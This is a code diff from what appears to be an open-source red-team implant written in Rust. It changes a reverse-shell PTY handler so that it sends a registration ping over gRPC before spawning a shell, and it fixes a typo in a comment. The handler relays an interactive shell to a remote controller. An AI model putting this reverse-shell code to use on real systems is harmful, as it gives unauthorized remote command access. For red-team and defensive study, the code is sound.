@@ -23,6 +23,29 @@ impl Dispatcher for ReverseShellPTYMessage {
         #[cfg(debug_assertions)]
         log::info!("starting reverse_shell_pty (task_id={})", task_id);
 
+        // Channels to manage gRPC stream
+        // Buffer must only be 1
+        // gRPC will only send when buffer is over-filled
+        let (output_tx, output_rx) = tokio::sync::mpsc::channel(1);
+        let (input_tx, mut input_rx) = tokio::sync::mpsc::channel(1);
+        let (exit_tx, mut exit_rx) = tokio::sync::mpsc::channel(1);
+
+        // First, send an initial registration message
+        match output_tx
+            .send(ReverseShellRequest {
+                task_id,
+                kind: ReverseShellMessageKind::Ping.into(),
+                data: Vec::new(),
+            })
+            .await
+        {
+            Ok(_) => {}
+            Err(_err) => {
+                #[cfg(debug_assertions)]
+                log::error!("failed to send initial registration message: {}", _err);
+            }
+        };
+
         // Use the native pty implementation for the system
         let pty_system = native_pty_system();
 
@@ -52,18 +75,12 @@ impl Dispatcher for ReverseShellPTYMessage {
             }
         };
 
-        // Appologies for the exclusionary language in the portable_pty dependency :(
+        // Apologies for the exclusionary language in the portable_pty dependency :(
         // We welcome PRs to replace this dependency / wrap it in more inclusive language
         // It would also be great to not spawn a shell as a child process
         let mut child = pair.slave.spawn_command(cmd)?;
         let mut reader = pair.master.try_clone_reader()?;
         let mut writer = pair.master.take_writer()?;
-
-        // Buffer must only be 1
-        // gRPC will only send when buffer is over-filled
-        let (output_tx, output_rx) = tokio::sync::mpsc::channel(1);
-        let (input_tx, mut input_rx) = tokio::sync::mpsc::channel(1);
-        let (exit_tx, mut exit_rx) = tokio::sync::mpsc::channel(1);
 
         // Spawn task to send PTY output
         const CHUNK_SIZE: usize = 1024; // 1 KB Limit (/chunk)
